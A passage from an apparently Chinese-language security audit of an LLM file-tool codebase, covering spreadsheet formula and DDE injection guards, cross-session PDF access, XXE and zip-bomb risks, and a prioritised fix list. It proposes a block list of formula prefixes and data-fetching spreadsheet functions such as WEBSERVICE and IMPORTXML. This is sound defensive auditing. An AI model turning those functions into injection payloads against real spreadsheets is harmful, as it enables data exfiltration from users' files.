`_file_cache.py:26-58`：`max_entries=128`，逐条淘汰，但**不限制单条或总和的字节数**。各 reader 的 `max_chars` 默认 20_000，但 `max_chars` 是 LLM 可传的参数字段，上限普遍是 `le=200_000`（如 `pdf_file.py:34-39` 的 `max_chars le=500` 只限页数、字符上限仍 200_000）。128 条 × 200 KB 量级在长会话里可累积到数十 MB，且 `PARSED_FILE_CACHE` 是模块级全局单例（`_file_cache.py:99`），跨会话共享、只有进程退出或 `clear()` 才回收。

不是漏洞，是内存管理弱点。

---

## 3. 历史结论复核表

| # | 历史结论 | 复核结果 | 证据 |
|---|---|---|---|
| 1 | `excel_edit.py:174-193` 拦截 `=` 前缀和 DDE `\|`，注释与代码一致 | **确认，行号完全吻合** | `:177-181` set_cell 拒绝 `startswith("=")`；`:184-193` set_formula 要求 `startswith("=")` + 拒绝 `\|`；`:189-191` 注释解释 DDE 语义，`:192-193` 是 `if "\|" in self.formula`。**注释与代码一致，属于全仓库少见的可信注释。** 补充：`set_number_format`（`:449-451`）**没有** `\|` 检查，只对 number_format 查控制符（`:217-218`）—— 数字格式里 DDE 不成立，实际无害，但仍是同一语义的两处不一致 |
| 2 | `csv_edit.py` 实现层完全没有这个防护 | **确认** | 见 F1。全文无 `startswith`、无 `\|` 检查、无前缀黑名单。唯一的写入校验 `_validate_row:83-90` 只查列数和长度 |
| 3 | `excel_create.py:64-73` 没有 `\|` 检查 | **确认，行号完全吻合** | `:64-73` 是 `SpreadsheetFormula.validate_formula`，只查 `_CELL_PATTERN`、`startswith("=")`、`_CONTROL_CHARS`。无 `\|`。且**整个文件都没有** `\|` 检查 |
| 4 | `excel_create.py` 的 `validate_sheet` 接受 `=`/`\|` 开头的单元格值，而 `excel_edit` 拒绝 | **确认，行号精确吻合** | `validate_sheet` 定义在 `:95-131`，其中单元格校验循环是 `:111-116`（与历史记录一致）。`:113-115` 只判 `len > _MAX_CELL_CHARS` 或 `_CONTROL_CHARS`。对照 `excel_edit.py:177-181` 拒绝 `=`。**同一语义两处不一致，历史结论成立** |
| 5 | `test_excel_create.py:19-25` 在 `node_modules` 缺失时跳过**整个文件** | **部分推翻（机制确认，范围夸大）** | `:19-25` 是 fixture `artifact_runtime`，跳过的是**请求该 fixture 的 3 个测试**，不是整个文件。另 2 个纯 Pydantic 校验测试正常执行。且 `node_modules` 确实不存在 → 跳过确实在生效 |
| 6 | 覆盖率为零 | **确认（针对公式注入）** | `:134-142` 的 5 个参数化用例不含任何 `= + - @ \|` 前缀用例；另外 2 个测试也不涉及。F1/F2 两个高危发现无任何测试覆盖 |

---

## 4. 结论：修复优先级

| 优先级 | 发现 | 工作量 |
|---|---|---|
| P0 | **F3** `pdf_edit.py` 跨会话越权读写 —— 修 `build_pdf_edit_tools` 真正使用 `session_root` | 小（约 10 行） |
| P1 | **F1** `csv_edit.py` 加公式注入防护 —— 抽共享 `_guard_cell_text` | 小 |
| P1 | **F2 / F2b** `excel_create.py` 的 `validate_formula` 和 `excel_edit.py` 的 `set_formula` 都加 `\|` + 函数名黑名单（`WEBSERVICE`/`WEBAPI`/`IMPORTXML`/`FILTERXML`/`DDE`/`HYPERLINK`），共用一个 `_guard_formula()` | 小 |
| P2 | **F4** 三个读侧工具（word/excel/pdf file）补 zip bomb 防护 | 中 |
| P2 | **F13** 补 `=`/`+`/`-`/`@`/`\|` 载荷的回归用例；CI 装 artifact-tool 或改 skipif | 小 |
| P3 | **F5** `_CONTROL_CHARS` 与"前缀检查"拆成两个独立检查 | 小 |
| P3 | **F9** `xml_edit` 显式 `resolve_entities=False` 或拒 `<!DOCTYPE` | 小 |
| P3 | **F14** 把 `pdf_edit_enabled` 补进 `config/default.yaml` | 一行 |
| P4 | **F6** secret 脱敏（会破坏 `expected_value`，需权衡） | 大 |
| P4 | **F7/F8/F15** zip 检查一致性、cache 字节上限 | 中 |

## 5. 待办 / 本轮未验证

- [ ] **XML billion-laughs（内部实体扩展 DoS）未验证**。两种外部实体写法已实测被阻断（`undefined entity`），但内部实体扩展的测试载荷在本机 expat（Python 3.11.9）上均以 `ParseError: not well-formed (invalid token)` 失败，ET / minidom / sax 三者报同一位置 → 判断是**我的载荷不合法**，而非 expat 阻断扩展。需要改用外部 `.dtd` 文件再测一轮，本轮不下"安全"结论。
- [ ] openpyxl / ExcelJS 对 `=`/`+`/`-`/`@` 前缀的实际单元格类型标注（`t="s"` vs `t="str"`）**未在真实 Excel 里复核**。F2 的判断基于对 openpyxl `_infer_value` 行为的知识，本轮无 Node 环境（`node_modules` 缺失）无法跑通 artifact-tool 验证。
- [ ] `pypdf` 自身的解析器攻击面（历史 CVE 类）未审计 —— 属第三方库范围。

## 6. 已排除的怀疑（负向结论）

这几条查过了、**没有问题**，记录下来避免下一轮重复劳动：

- **无死代码**。`src/backend/mcp/providers.py` 中本清单涉及的 31 个 `build_*` 工厂全部有调用点：reader 侧 `:190-224`（含 `build_markdown_file_tool` :192、`build_json_file_tool` :194、`build_yaml_file_tool` :195、`build_toml_file_tool` :196、`build_xml_file_tool` :197、`build_env_file_tool` :198、`build_properties_file_tool` :199、`build_ini_file_tool` :200、`build_word_tool` :221、`build_excel_tool` :222、`build_pdf_tool` :223）；edit 侧 `:245-354`。**没有任何一个工具文件是孤儿模块。**
- **无跨文件复用导致的攻击面串联**：`csv_edit.py` 不被 `excel_create` 或其他工具 import；`excel_create` 走独立的 Node/ExcelJS 通道；`_source_edit.py` 只被各语言 edit 模块复用（那是设计目的）。
- **`jsonl_edit.py` / `markdown_edit.py` / `yaml_edit.py` / `toml_edit.py` / `xml_edit.py` / `json_edit.py` / `ini_edit.py` / `properties_edit.py` 都没有 XML/YAML/JSON 反序列化执行面**：`json` 用标准库 `json.loads`，YAML 用 `safe_load_all`（F10），XML 的 XXE 面见 F9。没有 `pickle`、`marshal`、`__reduce__`、`eval(`、`exec(`、`subprocess` 在这些模块里。
- **`xmlrpc`、`lxml`、`defusedxml`、`resolve_entities`、`html.unescape`、`unquote` 在本工具集里 grep 零命中**（`xmlrpc` 全仓库也没有）。所以不存在 XMLRPC 反序列化攻击面。
- **宏/VBA 不可达**，见 F11。

---

## 7. 审计纪律备注

本轮**两次**遇到"注释与代码不符"，且方向相反：

1. `excel_edit.py:189-191` 的 DDE 注释 → **可信**（与 `:192-193` 一致）。全仓库少见的可信注释。
2. `yaml_edit.py:573-575` 的 `safe_load` 注释 → **可信**（实测属实）。
3. `excel_edit.py:570-574` 的 stored-entry 注释 → **可信**（解释了与 PowerPoint 的差异，属刻意权衡）。
4. **`pdf_edit.py:136-140` 的 docstring → 严重失实**。声称"session-scoped"、"output stays inside the session upload directory"，实际 `session_root` / `thread_id` 参数在函数体内零引用。**这是本次审计里危害最大的一条注释**。

结论与历史记录一致：这个仓库的注释不能用来判断攻击面，必须读代码。本轮所有结论均以 `文件:行号` + 代码片段为准。
